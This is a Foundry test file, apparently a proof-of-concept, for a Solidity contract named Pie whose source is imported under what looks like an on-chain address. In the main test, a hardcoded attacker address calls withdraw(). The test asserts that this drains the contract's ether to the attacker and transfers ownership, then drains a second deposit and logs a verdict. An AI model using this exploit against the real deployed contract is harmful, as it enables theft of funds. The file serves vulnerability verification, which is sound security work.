// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xd2018bfaa266a9ec0a1a84b061640faa009def76.sol";

contract PieTest is Test {
    Pie public pie;
    address public immutable attacker = 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
    uint256 public constant INITIAL_FUNDING = 1 ether;

    function setUp() public {
        pie = new Pie();
        vm.deal(address(pie), INITIAL_FUNDING);
    }

    function test_AttackerCanDrainFundsAndBecomeOwner() public {
        // === Differential State Logging - BEFORE ATTACK ===
        console2.log("--- BEFORE-Trigger Attack ---");
        address originalOwner = pie.Owner();
        uint256 originalContractBalance = address(pie).balance;
        uint256 originalAttackerBalance = attacker.balance;
        
        console2.log("Original Owner: ", originalOwner);
        console2.log("Original Contract Balance: %d", originalContractBalance);
        console2.log("Original Attacker Balance: %d", originalAttackerBalance);

        // === CRITICAL ATTACK OPERATION (1st Drain) ===
        console2.log("--- Trigger Attacker Drain Operation ---");
        uint256 initialAttackerBalance = originalAttackerBalance;
        vm.prank(attacker);
        pie.withdraw();
        
        // === Differential State Logging - AFTER FIRST ATTACK ===
        console2.log("--- AFTER-First Trigger ---");
        address newOwner = pie.Owner();
        uint256 newContractBalance = address(pie).balance;
        uint256 newAttackerBalance = attacker.balance;
        
        console2.log("New Owner: ", newOwner);
        console2.log("New Contract Balance: %d", newContractBalance);
        console2.log("New Attacker Balance: %d", newAttackerBalance);
        
        // === State Change Validation ===
        bool ownershipChanged = (newOwner != originalOwner);
        bool contractBalanceDrained = (newContractBalance == 0);
        bool fundsAddedToAttacker = (newAttackerBalance > originalAttackerBalance);
        bool vulnerabilityExploited = ownershipChanged && 
                                    contractBalanceDrained && 
                                    fundsAddedToAttacker;
        
        console2.log("=== State Change Analysis ===");
        console2.log("Ownership Changed: %s", ownershipChanged ? "YES" : "NO");
        console2.log("Contract Balance Drained: %s", contractBalanceDrained ? "YES" : "NO");
        console2.log("Funds Added to Attacker: %s", fundsAddedToAttacker ? "YES" : "NO");
        console2.log("Vulnerability Exploited: %s", vulnerabilityExploited ? "YES" : "NO");

        // === Existing verification and 2nd attack ===
        assertEq(address(pie).balance, 0, "Contract balance should be drained");
        assertEq(
            attacker.balance,
            initialAttackerBalance + INITIAL_FUNDING,
            "Attacker should receive contract funds"
        );

        // Verify contract ownership transfer
        uint256 newFunding = 0.5 ether;
        vm.deal(address(pie), newFunding);
        
        vm.prank(attacker);
        pie.withdraw();
        
        assertEq(address(pie).balance, 0, "Funds should be drained again");
        assertEq(
            attacker.balance,
            initialAttackerBalance + INITIAL_FUNDING + newFunding,
            "Attacker should receive second withdrawal"
        );

        // === Final Vulnerability Verdict ===
        if (vulnerabilityExploited) {
            console2.log("Vulnerability Exists: Attacker successfully drained funds and became contract owner");
        } else {
            console2.log("Vulnerability not Exist: No unauthorized ownership change or fund drain detected");
        }
    }

    function test_RegularUserCannotWithdraw() public {
        address normalUser = makeAddr("normalUser");
        vm.prank(normalUser);
        
        vm.expectRevert();
        pie.withdraw();
    }
}